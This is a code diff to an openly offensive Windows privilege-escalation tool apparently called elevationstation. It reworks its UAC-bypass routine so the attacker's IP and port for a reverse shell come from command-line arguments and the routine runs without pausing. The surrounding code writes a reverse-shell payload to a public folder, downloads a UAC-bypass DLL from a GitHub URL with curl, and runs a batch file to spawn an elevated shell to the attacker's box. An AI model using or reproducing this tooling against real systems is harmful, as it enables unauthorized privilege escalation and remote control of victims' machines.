@@ -845,7 +845,7 @@ int DupProcessToken(DWORD pid)
 
 }
 
-void uacbypass()
+void uacbypass(char* theip, char* theport)
 {
     DWORD procintegrity=CheckProcessIntegrity(GetCurrentProcessId());
     if (procintegrity != 0x3000)
@@ -862,12 +862,16 @@ void uacbypass()
         exit(0);
     }
     
+    
+    string revip = theip;
+    string portnum = theport;
+    
     cout << "generating rev shell payload now...\n";
-    string revip, portnum;
-    cout << "enter the ip for your attacker box for the rev3rse sh3ll:\n";
-    cin >> revip;
-    cout << "enter the port number for the rev3rse sh3ll:\n";
-    cin >> portnum;
+    //string revip, portnum;
+    //cout << "enter the ip for your attacker box for the rev3rse sh3ll:\n";
+    //cin >> revip;
+    //cout << "enter the port number for the rev3rse sh3ll:\n";
+    //cin >> portnum;
 
     ofstream mypayload;
     mypayload.open("c:\\users\\public\\elevationstation.js");
@@ -911,10 +915,11 @@ void uacbypass()
     WinExec("curl -# -L -o \"c:\\temp\\netutils.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
     Color(2);
     cout << "[+] while waiting for download to finish, go ahead and start your listener on your attacker box\n";
-    cout << "You can see the download progress for two files in your foothold reverse shell ;)\nhit [enter] when both reach 100 percent and enjoy your newly spawned elevated shell!\n";
+    //cout << "You can see the download progress for two files in your foothold reverse shell ;)\nhit [enter] when both reach 100 percent and enjoy your newly spawned elevated shell!\n";
     Color(7);
-    cin.get();
-    cin.get();
+    Sleep(7000);
+    //cin.get();
+    //cin.get();
     WinExec("c:\\users\\public\\elevateit.bat", 0);
 
 }
@@ -927,7 +932,7 @@ void commandlist()
     printf("usage: elevationstation.exe -p 1234 -d\n");
     printf("usage: elevationstation.exe -p 1234 -dt\n");
     printf("usage: elevationstation.exe -np\n");
-    printf("usage: elevationstation.exe -uac\n");
+    printf("usage: elevationstation.exe -uac attackerip port\n");
     printf("usage: elevationstation.exe -p 1234 -dll\n");
     printf("usage: elevationstation.exe -lcp\n");
     printf("usage: elevationstation.exe -p 1234 -l\n");
@@ -968,7 +973,7 @@ int main(int argc, char* argv[])
     }
     if (strcmp(argv[1], "-uac") == 0)
     {
-        uacbypass();
+        uacbypass(argv[2], argv[3]);
         exit(0);
     }
     if (strcmp(argv[1], "-lcp") == 0)
